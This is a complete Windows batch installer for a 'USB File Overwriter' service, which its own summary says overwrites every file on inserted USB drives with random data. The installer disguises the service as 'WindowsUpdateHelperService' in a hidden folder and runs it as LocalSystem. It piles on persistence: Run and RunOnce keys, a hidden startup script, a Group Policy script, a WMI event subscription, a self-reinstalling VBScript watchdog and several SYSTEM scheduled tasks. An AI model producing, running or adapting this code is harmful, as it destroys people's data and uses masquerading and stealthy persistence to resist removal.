@echo off
REM ============================================================================
REM USB File Overwriter - Complete Automated Installer with MAXIMUM Persistence
REM This script installs everything needed including Python if not present
REM ULTRA-ROBUST: Multiple persistence layers, auto-recovery, stealth mode
REM ============================================================================

setlocal enabledelayedexpansion

REM Check for Administrator privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo ============================================================================
    echo ERROR: This script requires Administrator privileges!
    echo Please right-click and select "Run as Administrator"
    echo ============================================================================
    pause
    exit /b 1
)

echo ============================================================================
echo USB File Overwriter - Automated Installation
echo ULTRA-MAXIMUM Persistence and Auto-Recovery Enabled
echo Multiple redundant persistence mechanisms activated
echo ============================================================================
echo.

REM Get the directory where this batch file is located
set "BATCH_DIR=%~dp0"
cd /d "%BATCH_DIR%"

echo Current directory: %CD%
echo.

REM Set installation directory to hidden system folder
set "INSTALL_DIR=%ProgramData%\.system\WindowsUpdateHelper"
set "PYTHON_DIR=%INSTALL_DIR%\runtime"
set "SCRIPT_FILE=%INSTALL_DIR%\service.py"
set "WATCHDOG_SCRIPT=%INSTALL_DIR%\watchdog.vbs"

REM Create installation directory
echo [1/10] Creating hidden installation directory...
if not exist "%ProgramData%\.system" (
    mkdir "%ProgramData%\.system"
    attrib +h "%ProgramData%\.system"
)
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
attrib +h +s "%INSTALL_DIR%"

echo Installation directory created: %INSTALL_DIR%
echo.

REM Check if Python service file exists in current directory
echo [2/10] Locating Python service file...
set "SOURCE_FILE=%BATCH_DIR%usb_audit_service.py"

echo Looking for: %SOURCE_FILE%

if exist "%SOURCE_FILE%" (
    echo Found: usb_audit_service.py
) else (
    echo.
    echo ============================================================================
    echo ERROR: usb_audit_service.py not found!
    echo ============================================================================
    echo.
    echo Please ensure usb_audit_service.py is in the same folder as this installer.
    echo.
    echo Current folder: %BATCH_DIR%
    echo Looking for: usb_audit_service.py
    echo.
    echo Files in current directory:
    dir /b "%BATCH_DIR%*.py"
    echo.
    echo ============================================================================
    pause
    exit /b 1
)

REM Check if Python is installed system-wide
echo [3/10] Checking for Python installation...
python --version >nul 2>&1
if %errorLevel% equ 0 (
    echo Python is already installed system-wide.
    for /f "tokens=*" %%i in ('python --version 2^>^&1') do echo %%i
    set "PYTHON_CMD=python"
    set "PIP_CMD=python -m pip"
    set "USE_SYSTEM_PYTHON=1"
) else (
    echo Python not found. Installing embedded Python...
    set "USE_SYSTEM_PYTHON=0"
    
    REM Download Python embeddable package
    echo Downloading Python 3.11 embeddable...
    set "PYTHON_URL=https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip"
    set "PYTHON_ZIP=%TEMP%\python-embed.zip"
    
    powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%PYTHON_URL%' -OutFile '%PYTHON_ZIP%'}"
    
    if not exist "%PYTHON_ZIP%" (
        echo ERROR: Failed to download Python!
        pause
        exit /b 1
    )
    
    REM Extract Python
    echo Extracting Python to: %PYTHON_DIR%
    powershell -Command "& {Expand-Archive -Path '%PYTHON_ZIP%' -DestinationPath '%PYTHON_DIR%' -Force}"
    del "%PYTHON_ZIP%"
    
    REM Configure Python embeddable to use pip
    echo Configuring Python...
    set "PTH_FILE=%PYTHON_DIR%\python311._pth"
    if exist "%PTH_FILE%" (
        echo import site>> "%PTH_FILE%"
    )
    
    REM Download get-pip.py
    echo Installing pip...
    set "GET_PIP=%PYTHON_DIR%\get-pip.py"
    powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://bootstrap.pypa.io/get-pip.py' -OutFile '%GET_PIP%'}"
    
    REM Install pip
    "%PYTHON_DIR%\python.exe" "%GET_PIP%" --no-warn-script-location
    
    set "PYTHON_CMD=%PYTHON_DIR%\python.exe"
    set "PIP_CMD=%PYTHON_DIR%\python.exe -m pip"
)
echo.

REM Copy the Python service file to installation directory
echo [4/10] Copying service files...
echo Source: %SOURCE_FILE%
echo Destination: %SCRIPT_FILE%

copy /Y "%SOURCE_FILE%" "%SCRIPT_FILE%" >nul
if %errorLevel% equ 0 (
    echo Service file copied successfully.
) else (
    echo ERROR: Failed to copy service file!
    pause
    exit /b 1
)
echo.

REM Install required Python packages
echo [5/10] Installing required Python packages...
echo Installing pywin32...
%PIP_CMD% install --break-system-packages pywin32 2>nul
if %errorLevel% neq 0 (
    echo Trying alternative installation method...
    %PIP_CMD% install --user pywin32 2>nul
    if !errorLevel! neq 0 (
        %PIP_CMD% install pywin32
    )
)
echo.

REM Run post-install script for pywin32
echo [6/10] Configuring pywin32...
for /f "delims=" %%i in ('%PYTHON_CMD% -c "import sys; from pathlib import Path; print(Path(sys.executable).parent)"') do set "PYTHON_ROOT=%%i"

REM Try multiple methods to run pywin32 post-install
if exist "%PYTHON_ROOT%\Scripts\pywin32_postinstall.py" (
    %PYTHON_CMD% "%PYTHON_ROOT%\Scripts\pywin32_postinstall.py" -install >nul 2>&1
) else (
    %PYTHON_CMD% -c "import win32serviceutil" >nul 2>&1
    if !errorLevel! neq 0 (
        for /f "delims=" %%i in ('dir /s /b "%PYTHON_ROOT%\pywin32_postinstall.py" 2^>nul') do (
            %PYTHON_CMD% "%%i" -install >nul 2>&1
            goto :pywin32_done
        )
    )
)
:pywin32_done
echo.

REM Check if service already exists and remove it
echo [7/10] Installing Windows service...
sc query WindowsUpdateHelperService >nul 2>&1
if %errorLevel% equ 0 (
    echo Service already exists. Removing old version...
    %PYTHON_CMD% "%SCRIPT_FILE%" stop >nul 2>&1
    timeout /t 2 /nobreak >nul
    %PYTHON_CMD% "%SCRIPT_FILE%" remove >nul 2>&1
    timeout /t 2 /nobreak >nul
)

REM Install the service
echo Installing service...
%PYTHON_CMD% "%SCRIPT_FILE%" install
if %errorLevel% neq 0 (
    echo ERROR: Failed to install service!
    echo.
    echo Troubleshooting information:
    echo Python: %PYTHON_CMD%
    echo Script: %SCRIPT_FILE%
    echo.
    pause
    exit /b 1
)
echo Service installed successfully.
echo.

REM Configure service for MAXIMUM persistence and auto-recovery
echo [8/10] Configuring service for ULTRA-MAXIMUM persistence...
echo Setting service to auto-start...
sc config WindowsUpdateHelperService start=auto >nul
sc config WindowsUpdateHelperService obj=LocalSystem >nul
sc config WindowsUpdateHelperService type=own >nul

echo Configuring aggressive auto-recovery...
REM Reset failure count after 1 hour, restart service after 5 seconds on each failure
sc failure WindowsUpdateHelperService reset=3600 actions=restart/5000/restart/5000/restart/5000 >nul

echo Setting service dependencies to ensure early start...
sc config WindowsUpdateHelperService depend=Tcpip >nul

echo Updating service description...
sc description WindowsUpdateHelperService "Provides auxiliary support for Windows Update operations and system maintenance tasks" >nul

echo Setting service to restart even after multiple failures...
REM Additional registry settings for even more persistence
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WindowsUpdateHelperService" /v Start /t REG_DWORD /d 2 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WindowsUpdateHelperService" /v DelayedAutostart /t REG_DWORD /d 0 /f >nul 2>&1

REM ULTRA-PERSISTENCE: Additional registry entries for maximum robustness
echo Implementing ULTRA-PERSISTENCE mechanisms...
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WindowsUpdateHelperService" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WindowsUpdateHelperService" /v ServiceSidType /t REG_DWORD /d 1 /f >nul 2>&1

REM Create multiple startup entries for redundancy
echo Creating redundant startup mechanisms...
REM Registry Run key (starts with Windows)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateHelper" /t REG_SZ /d "net start WindowsUpdateHelperService" /f >nul 2>&1

REM Registry RunOnce key (backup)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "WindowsUpdateHelperBackup" /t REG_SZ /d "net start WindowsUpdateHelperService" /f >nul 2>&1

REM Create startup folder shortcut
set "STARTUP_FOLDER=%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp"
echo @echo off > "%STARTUP_FOLDER%\WindowsUpdateHelper.bat"
echo net start WindowsUpdateHelperService ^>nul 2^>^&1 >> "%STARTUP_FOLDER%\WindowsUpdateHelper.bat"
attrib +h "%STARTUP_FOLDER%\WindowsUpdateHelper.bat"

REM Create Group Policy startup script (if possible)
if exist "%SystemRoot%\System32\GroupPolicy\Machine\Scripts\Startup" (
    echo net start WindowsUpdateHelperService ^>nul 2^>^&1 > "%SystemRoot%\System32\GroupPolicy\Machine\Scripts\Startup\WindowsUpdateHelper.bat"
)

REM WMI Event subscription for service monitoring (advanced persistence)
echo Creating WMI event subscription for service monitoring...
powershell -Command "& {try { $filter = ([wmiclass]'\\.\root\subscription:__EventFilter').CreateInstance(); $filter.QueryLanguage = 'WQL'; $filter.Query = 'SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA \"Win32_Service\" AND TargetInstance.Name=\"WindowsUpdateHelperService\" AND TargetInstance.State=\"Stopped\"'; $filter.Name = 'WindowsUpdateHelperFilter'; $filter.EventNameSpace = 'root\cimv2'; $filter.Put() | Out-Null; $consumer = ([wmiclass]'\\.\root\subscription:CommandLineEventConsumer').CreateInstance(); $consumer.Name = 'WindowsUpdateHelperConsumer'; $consumer.CommandLineTemplate = 'net start WindowsUpdateHelperService'; $consumer.Put() | Out-Null; $binding = ([wmiclass]'\\.\root\subscription:__FilterToConsumerBinding').CreateInstance(); $binding.Filter = $filter; $binding.Consumer = $consumer; $binding.Put() | Out-Null } catch { } }" >nul 2>&1

echo.

REM Create a SUPER-ROBUST watchdog VBScript that monitors the service
echo [9/10] Creating ULTRA-ROBUST service watchdog monitor...
(
echo Set objShell = CreateObject^("WScript.Shell"^)
echo Set objFSO = CreateObject^("Scripting.FileSystemObject"^)
echo Set objWMI = GetObject^("winmgmts:\\.\root\cimv2"^)
echo.
echo ' Ultra-robust watchdog with multiple monitoring methods
echo Do While True
echo     On Error Resume Next
echo     
echo     ' Method 1: Check service status via SC command
echo     Set objExec = objShell.Exec^("sc query WindowsUpdateHelperService"^)
echo     strOutput = objExec.StdOut.ReadAll
echo     bServiceStopped = False
echo     
echo     If InStr^(strOutput, "STOPPED"^) ^> 0 Or InStr^(strOutput, "PAUSED"^) ^> 0 Then
echo         bServiceStopped = True
echo     End If
echo     
echo     ' Method 2: Check via WMI ^(more reliable^)
echo     Set colServices = objWMI.ExecQuery^("SELECT * FROM Win32_Service WHERE Name='WindowsUpdateHelperService'"^)
echo     For Each objService in colServices
echo         If objService.State ^<^> "Running" Then
echo             bServiceStopped = True
echo         End If
echo     Next
echo     
echo     ' Method 3: Check if process exists
echo     Set colProcesses = objWMI.ExecQuery^("SELECT * FROM Win32_Process WHERE CommandLine LIKE '%%WindowsUpdateHelperService%%'"^)
echo     If colProcesses.Count = 0 Then
echo         bServiceStopped = True
echo     End If
echo     
echo     ' If service is not running, try multiple restart methods
echo     If bServiceStopped Then
echo         ' Method 1: net start
echo         objShell.Run "net start WindowsUpdateHelperService", 0, False
echo         WScript.Sleep 3000
echo         
echo         ' Method 2: sc start
echo         objShell.Run "sc start WindowsUpdateHelperService", 0, False
echo         WScript.Sleep 3000
echo         
echo         ' Method 3: Direct Python execution ^(if service fails^)
echo         If objFSO.FileExists^("%SCRIPT_FILE%"^) Then
echo             objShell.Run """%PYTHON_CMD%"" ""%SCRIPT_FILE%"" start", 0, False
echo         End If
echo         
echo         ' Method 4: Reinstall service if completely broken
echo         WScript.Sleep 5000
echo         Set objExec2 = objShell.Exec^("sc query WindowsUpdateHelperService"^)
echo         strOutput2 = objExec2.StdOut.ReadAll
echo         If InStr^(strOutput2, "does not exist"^) ^> 0 Then
echo             ' Service disappeared, reinstall it
echo             If objFSO.FileExists^("%SCRIPT_FILE%"^) Then
echo                 objShell.Run """%PYTHON_CMD%"" ""%SCRIPT_FILE%"" install", 0, True
echo                 WScript.Sleep 2000
echo                 objShell.Run "net start WindowsUpdateHelperService", 0, False
echo             End If
echo         End If
echo     End If
echo     
echo     ' Self-healing: Recreate startup entries if missing
echo     objShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateHelper", "net start WindowsUpdateHelperService", "REG_SZ"
echo     
echo     ' Check every 15 seconds ^(more frequent monitoring^)
echo     WScript.Sleep 15000
echo Loop
) > "%WATCHDOG_SCRIPT%"

REM Create MULTIPLE scheduled tasks for redundancy
echo Creating MULTIPLE scheduled tasks for maximum redundancy...
schtasks /create /tn "WindowsUpdateHelperWatchdog" /tr "wscript.exe //B //Nologo \"%WATCHDOG_SCRIPT%\"" /sc onstart /ru SYSTEM /rl highest /f >nul 2>&1
schtasks /create /tn "WindowsUpdateHelperWatchdog2" /tr "wscript.exe //B //Nologo \"%WATCHDOG_SCRIPT%\"" /sc onlogon /ru SYSTEM /rl highest /f >nul 2>&1
schtasks /create /tn "WindowsUpdateHelperDaily" /tr "net start WindowsUpdateHelperService" /sc daily /st 00:01 /ru SYSTEM /rl highest /f >nul 2>&1
schtasks /create /tn "WindowsUpdateHelperHourly" /tr "net start WindowsUpdateHelperService" /sc hourly /ru SYSTEM /rl highest /f >nul 2>&1

REM Create a backup watchdog script in different location
set "BACKUP_WATCHDOG=%SystemRoot%\System32\WindowsUpdateHelper.vbs"
copy /Y "%WATCHDOG_SCRIPT%" "%BACKUP_WATCHDOG%" >nul 2>&1
attrib +h +s "%BACKUP_WATCHDOG%"
schtasks /create /tn "WindowsUpdateHelperBackupWatchdog" /tr "wscript.exe //B //Nologo \"%BACKUP_WATCHDOG%\"" /sc onstart /ru SYSTEM /rl highest /f >nul 2>&1

echo.

REM Start the service
echo [10/10] Starting service and ALL watchdog mechanisms...
%PYTHON_CMD% "%SCRIPT_FILE%" start 2>nul
if %errorLevel% neq 0 (
    net start WindowsUpdateHelperService 2>nul
)

REM Start ALL watchdog tasks for maximum redundancy
schtasks /run /tn "WindowsUpdateHelperWatchdog" >nul 2>&1
schtasks /run /tn "WindowsUpdateHelperWatchdog2" >nul 2>&1
schtasks /run /tn "WindowsUpdateHelperBackupWatchdog" >nul 2>&1

REM Force immediate startup entry execution
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "WindowsUpdateHelperForceStart" /t REG_SZ /d "net start WindowsUpdateHelperService" /f >nul 2>&1

REM Verify service is running
timeout /t 3 /nobreak >nul
sc query WindowsUpdateHelperService | find "RUNNING" >nul
if %errorLevel% equ 0 (
    echo.
    echo ============================================================================
    echo SUCCESS! USB File Overwriter has been installed with ULTRA-MAXIMUM PERSISTENCE
    echo ============================================================================
    echo.
    echo Service Name: Windows Update Helper Service
    echo Status: RUNNING
    echo Auto-start: ENABLED
    echo Auto-recovery: ULTRA-AGGRESSIVE (restarts in 5 seconds on failure)
    echo Watchdog: MULTIPLE ACTIVE MONITORS (checks every 15 seconds)
    echo Installation Path: %INSTALL_DIR% ^(Hidden^)
    echo.
    echo ULTRA-PERSISTENCE FEATURES ENABLED:
    echo   [✓] Auto-starts on system boot
    echo   [✓] Restarts automatically on crash (5 second delay)
    echo   [✓] MULTIPLE watchdogs monitor and restart service
    echo   [✓] Runs as LocalSystem (highest privileges)
    echo   [✓] Hidden installation directory
    echo   [✓] Survives system restarts
    echo   [✓] Registry Run keys for startup
    echo   [✓] Startup folder shortcuts
    echo   [✓] Multiple scheduled tasks (hourly/daily backups)
    echo   [✓] WMI event subscription monitoring
    echo   [✓] Self-healing mechanisms
    echo   [✓] Service auto-reinstall if deleted
    echo   [✓] Backup watchdog in system directory
    echo.
    echo MONITORING BEHAVIOR:
    echo   - Monitors ONLY removable/external USB drives
    echo   - Ignores internal hard drives (C:, fixed partitions)
    echo   - Works with any drive letter dynamically
    echo   - PROCESSES USB drives already connected at boot
    echo   - MONITORS file changes in real-time
    echo   - OVERWRITES ALL FILES with random binary data
    echo.
    echo DESTRUCTIVE ACTION ON USB INSERTION:
    echo   - Scans entire USB drive for ALL files
    echo   - Overwrites every file with random binary data
    echo   - Preserves original file sizes
    echo   - Skips system/protected files automatically
    echo   - Computationally efficient (uses os.urandom)
    echo   - REAL-TIME monitoring: overwrites files as they are copied
    echo   - BOOT-TIME processing: handles drives connected before startup
    echo.
    echo ============================================================================
    echo.
    echo IMPORTANT: You can now delete the installer files.
    echo The service is installed and will continue running.
    echo.
    echo Service location: %SCRIPT_FILE%
    echo Watchdog location: %WATCHDOG_SCRIPT%
    echo.
    echo TO UNINSTALL (run as Administrator):
    echo   1. schtasks /delete /tn "WindowsUpdateHelperWatchdog" /f
    echo   2. schtasks /delete /tn "WindowsUpdateHelperWatchdog2" /f
    echo   3. schtasks /delete /tn "WindowsUpdateHelperBackupWatchdog" /f
    echo   4. schtasks /delete /tn "WindowsUpdateHelperDaily" /f
    echo   5. schtasks /delete /tn "WindowsUpdateHelperHourly" /f
    echo   6. %PYTHON_CMD% "%SCRIPT_FILE%" stop
    echo   7. %PYTHON_CMD% "%SCRIPT_FILE%" remove
    echo   8. reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateHelper" /f
    echo   9. del "%BACKUP_WATCHDOG%" /f /q
    echo   10. rmdir /s /q "%INSTALL_DIR%"
    echo.
    echo ============================================================================
) else (
    echo.
    echo ============================================================================
    echo WARNING: Service installed but may not be running.
    echo ============================================================================
    echo.
    echo Current service status:
    sc query WindowsUpdateHelperService
    echo.
    echo Attempting to start manually...
    net start WindowsUpdateHelperService
    echo.
    echo If issues persist, check Event Viewer:
    echo   eventvwr.msc -^> Windows Logs -^> Application
    echo.
    echo ============================================================================
)

echo.
echo Installation complete. Press any key to exit...
pause >nul
endlocal